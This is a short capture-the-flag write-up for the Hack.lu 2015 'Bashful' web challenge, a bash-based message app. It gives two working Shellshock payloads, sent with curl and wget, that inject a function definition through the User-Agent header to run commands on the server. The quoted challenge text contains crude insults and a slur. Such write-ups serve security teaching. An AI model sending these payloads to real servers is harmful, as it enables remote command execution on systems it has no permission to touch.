#Hack.lu 2015 Bashful [web] 200

##Problem
"How did I end up here?" is the only question you can think of since you've become a high school teacher. Let's face it, you hate children. Bunch of egocentric retards. Anyway, you are not going to take it anymore. It's time to have your little midlife crisis right in the face of these fuckers.<br>
Good thing that you're in the middle of some project days and these little dipshits wrote a simple message storing web application. How cute. It's written in bash... that's... that's... aw- no... bashful. You've got the source, you've got the skills. 0wn the shit out of this and show them who's b0ss.<br>
<br>
[Challenge](https://school.fluxfingers.net:1503/)<br>
[Source](https://school.fluxfingers.net/static/chals/bashful_a77db9359a404ec7443d6455152e54b6.tar.bz2)

##Solution
It's a classic **Shellshock** problem, since the website uses bash to deal with all the inputs and outputs.<br>
[Shellshock Reference](https://blog.cloudflare.com/inside-shellshock/)

So we can use curl or wget to send requests via user-agent.<br>
<pre>
<code>
$ curl -H "User-Agent: (){ test;} /bin/cat flag" https://school.fluxfingers.net:1503/
$ wget -U "() { test;}; /bin/cat flag" https://school.fluxfingers.net:1503
</code>
</pre>
And the flag is: **flag{as_classic_as_it_could_be}**
